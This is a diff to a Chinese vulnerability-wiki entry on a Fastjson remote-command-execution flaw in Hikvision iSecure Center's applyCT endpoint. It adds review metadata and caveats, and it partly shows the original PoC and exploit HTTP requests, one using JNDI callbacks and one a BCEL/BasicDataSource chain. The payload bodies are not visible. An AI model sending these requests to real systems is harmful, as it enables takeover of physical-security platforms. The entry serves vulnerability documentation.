@@ -1,9 +1,57 @@
 ---
-fofa: "查询语法：**"
 source: "wy876 漏洞文库"
+id: "vw-369521b3043affd3e96bf90a"
+entity_id: "ve-369521b3043affd3e96bf90a"
+schema_version: "1"
+fofa_unverified: "查询语法：**"
+title: "海康威视iSecure Center 综合安防管理平台存在applyCT Fastjson命令执行漏洞"
+product: "Hikvision iSecure Center BIC"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+identifier_role: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+prerequisites: "出网LDAP/JDK限制或本地Tomcat dbcp2/BCEL类可用，Fastjson类型策略；版本未知"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86iSecureCenter%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8applyCTFastjson%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
+review_date: "2026-10-02"
+side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据；回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE"
+source_url: "https://www.yuque.com/xiaokp7/ocvun2/yvgfr4gvmvbionwq"
+source_status: "recorded"
 ---
 
 # 海康威视iSecure Center 综合安防管理平台存在applyCT Fastjson命令执行漏洞
+
+<!-- article-review:devices:begin -->
+## 技术校订与证据边界（2026-10-02）
+
+- 产品/组件：Hikvision iSecure Center BIC
+- 本文讨论：applyCT反序列化，JNDI或BCEL链
+- 版本、权限与配置前提：出网LDAP/JDK限制或本地Tomcat dbcp2/BCEL类可用，Fastjson类型策略；版本未知
+- 资料类型：Fastjson两类RCE载荷；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果
+
+### 逐项校订
+
+- 短JNDI PoC Content-Length5727明显不符；DNS回连只证明解析/连接不等于RCE
+- 不出网并非唯一BCEL条件，需指定JDK/依赖/类型策略；JNDI也非仅出网就能执行
+- BCEL编码与873逐字符相同，已静态确认Java8 TomcatEcho，但applyCT入口不同应独立
+- 无响应/源码；Testcmd与cmd头是不同回显链要求，须保留区分
+- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证
+
+### 操作风险与恢复
+
+- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据
+- 回连样例可能向外部地址发送网络请求或建立会话；应使用自己的隔离回连服务，DNS/LDAP 到达只能证明相应交互，不能单独证明 RCE
+
+### 待核与来源
+
+- 两链依赖矩阵/鉴权/原始来源待核；未执行字节码
+- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
+- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
+<!-- article-review:devices:end -->
+
 
 # 1、漏洞描述
 <font style="color:rgb(0, 0, 0);">  HIKVISION iSecure Center综合安防管理平台是一套“集成化”、“智能化”的平台，通过接入视频监控、一卡通、停车场、报警检测等系统的设备，获取边缘节点数据，实现安防信息化集成与联动，以电子地图为载体，融合各系统能力实现丰富的智能应用。HIKVISION iSecure Center平台基于“统一软件技术架构”先进理念设计，采用业务组件化技术，满足平台在业务上的弹性扩展。该平台适用于全行业通用综合安防业务，对各系统资源进行了整合和集中管理，实现统一部署、统一配置、统一管理和统一调度。海康威视综合安防管理平台存在Fastjson远程命令执行漏洞，该漏洞可执行系统命令，可获取到目标服务器系统权限以及敏感数据信息。</font>
@@ -20,7 +68,7 @@ source: "wy876 漏洞文库"
 # <font style="color:rgb(0, 0, 0);">4、漏洞复现</font>
 poc：
 
-```plain
+```http
 POST /bic/ssoService/v1/applyCT HTTP/1.1
 Host: *
 User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
@@ -38,7 +86,7 @@ exp：
 
 出网情况下可利用JNDIExploit
 
-```plain
+```http
 POST /bic/ssoService/v1/applyCT HTTP/1.1
 Host: 
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0
@@ -56,7 +104,7 @@ Content-Length: 215
 
 不出网状况下通过org.apache.tomcat.dbcp.dbcp2.BasicDataSource
 
-```plain
+```http
 POST /bic/ssoService/v1/applyCT HTTP/1.1
 Host: *
 User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
